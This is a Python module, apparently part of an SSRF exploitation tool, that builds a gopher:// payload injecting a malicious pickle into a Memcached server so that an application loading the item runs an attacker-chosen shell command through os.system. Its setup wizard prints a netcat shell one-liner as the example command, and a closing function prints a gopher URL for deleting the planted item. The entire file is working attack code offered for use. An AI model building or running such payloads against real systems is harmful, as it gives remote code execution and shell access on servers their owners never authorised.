import pickle
import os

from .base import *

class PyMemcached(GENERATOR):
    requirement = ["command"]
    def __init__(self, parser,options={}):
        if options["port"] == 0:
            options["port"] = 11211
        super().__init__(parser,options)
        self.set_requirement(self.requirement)
        arg = self.get_requirement()
        if arg.command == "":
            self.command = self.wizard()
        else:
            self.command = arg.command

    def generate(self):
        cmd = self.command
        class PickleRCE(object):
            def __reduce__(self):
                if(cmd):
                    return (os.system,(cmd,))

        command = (pickle.dumps(PickleRCE()))
        self.set_mode(PAYLOAD_TYPE.NONE).\
            set_payload(get_payload(command))
        
        return super().generate()

    def wizard(self):  
        print(" Example: rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l server_ip port > /tmp/f")
        command = input("\033[96m" +"Give payload you want to run in Memcached Server: "+ "\033[0m")
        return command
        pass

    def tailcall(self):   
        print("\033[93m" +"\nAfter everything done, you can delete memcached item by using this payload: \n"+ "\033[0m")
        print("\033[04m" + f"gopher://{self.host}:{self.port}/_%0d%0adelete%20SpyD3r%0d%0a"+ "\033[0m")
        print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")

def get_payload(command):
    payload = urllib.parse.quote_plus(command).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
    finalpayload = "%0d%0aset%20SpyD3r%201%2060%20" + str(len(command)) + "%0d%0a" +  payload + "%0d%0a"
    return finalpayload